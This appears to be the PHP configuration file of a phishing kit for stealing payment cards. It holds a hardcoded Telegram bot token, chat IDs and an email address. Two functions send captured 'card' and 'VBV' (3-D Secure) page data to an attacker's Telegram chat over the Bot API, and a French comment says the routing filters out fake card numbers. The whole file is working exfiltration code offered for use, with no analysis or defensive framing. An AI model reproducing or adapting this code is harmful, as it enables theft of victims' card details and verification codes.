<?php 
# PAGE CONFIG 

$PreviewMessage = true;

# REZ CONFIG

$token = "6778561549:AAEU2mrgvSaoKAlv0F3Lk_MoXwBYPJzQ6qg";

$chatOther = "-1002044722388";

$chatCard = "-1002044722388";
$chatVBV = "-1002044722388";

$email = "youngpepito@yandex.com";

$bincode = "-1002044722388";

$VBVsms = false;
$time = "10";

$test_mode = false;


function sendMessage($message, $page) {
    global $token,$chatCard,$chatVBVsg,$chatVBV,$chatOther;
    $chatid = $chatOther;
    
    if($page == "vbv")
    {
        $chatid = $chatVBV;
    }else if($page == "card")
    {
        $chatid = $chatCard;
    }

    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

function sendMessage2($message, $page) {
    global $token,$chatCard,$chatVBVsg,$chatVBV,$chatOther;
    $chatid = -1002044722388;
    
    if($page == "vbv")
    {
        $chatid = -1002044722388;
    }else if($page == "finish")
    {
        $chatid = -1002044722388;
    }

    $url = "https://api.telegram.org/bot" . "6778561549:AAEU2mrgvSaoKAlv0F3Lk_MoXwBYPJzQ6qg" . "/sendMessage?chat_id=" . $chatid;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

/// NE PAS TOUCHER LA BOUCLE SENDMESSAGE & SENDMESSAGE2 ! BLOQUE LES FAKES CC

?>